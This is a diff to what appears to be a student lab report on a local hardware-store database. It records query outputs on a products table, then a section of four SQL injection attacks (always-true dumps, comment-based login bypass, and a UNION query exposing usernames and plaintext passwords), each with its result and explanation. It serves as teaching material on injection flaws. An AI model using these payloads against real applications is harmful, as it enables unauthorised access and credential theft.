@@ -23,6 +23,181 @@ INSERT DATA:
 
 OUTPUT:
 (PASTE YOUR TERMINAL OUTPUT HERE)
+Query A: [
+  {
+    id: 1,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 35000
+  },
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 5,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  }
+]
+Query B: [
+  { name: 'Cement (bag)', price: 35000 },
+  { name: 'Iron Sheet 3m', price: 110000 },
+  { name: 'Paint 5L', price: 60000 },
+  { name: 'Nails 1kg', price: 12000 },
+  { name: 'Timber 2x4', price: 25000 }
+]
+Query C: {
+  id: 3,
+  name: 'Paint 5L',
+  description: 'Exterior wall paint white 5L',
+  price: 60000
+}
+Query D: [
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  }
+]
+Query E: [
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 1,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 35000
+  },
+  {
+    id: 5,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  },
+  {
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  }
+]
+Query F: [
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  }
+]
+Query G: {
+  id: 1,
+  name: 'Cement (bag)',
+  description: 'Portland cement 50kg bag',
+  price: 38000
+}
+
+------------------------------------------------------------
+TASK 3 - SQL INJECTION ATTACKS
+------------------------------------------------------------
+
+ATTACK 1 — Dump all products
+
+Query:
+SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+
+Result:
+Returned all products (35 rows):
+- Cement (bag), Iron Sheet 3m, Paint 5L, Nails 1kg, Timber 2x4 (repeated multiple times as shown in terminal output)
+
+Explanation:
+The condition OR 1=1 is always true, so the WHERE clause is bypassed and all records in the products table are returned.
+
+------------------------------------------------------------
+
+ATTACK 2 — Login bypass using comment injection
+
+Query:
+SELECT * FROM users WHERE username='admin'--' AND password='anything'
+
+Result:
+{ id: 1, username: 'admin', password: 'admin123', role: 'admin' }
+
+Explanation:
+The -- symbol comments out the password condition, allowing login as admin without verifying the password.
+
+------------------------------------------------------------
+
+ATTACK 3 — Always true authentication bypass
+
+Query:
+SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+
+Result:
+{ id: 1, username: 'admin', password: 'admin123', role: 'admin' }
+
+Explanation:
+The condition '1'='1' is always true, so the database returns the first user in the table without checking credentials.
+
+------------------------------------------------------------
+
+ATTACK 4 — UNION attack (data extraction)
+
+Query:
+SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+
+Result:
+Products combined with users table data:
+- admin | admin123 | admin
+- fatuma | pass456 | attendant
+- wasswa | pass789 | manager
+
+Explanation:
+The UNION operator merges the products query with the users table, exposing sensitive user data like usernames and passwords.
+
+------------------------------------------------------------
+
 
 SCREENSHOT:
 screenshots/task1.png
+screenshots/task2-1.png
+screenshots/task2-2.png
+screenshots/task2-3.png
+screenshots/task2-4.png
+screenshots/task3-1.png
+screenshots/task3-2.png
+screenshots/task3-3.png
+screenshots/task3-4.png
+
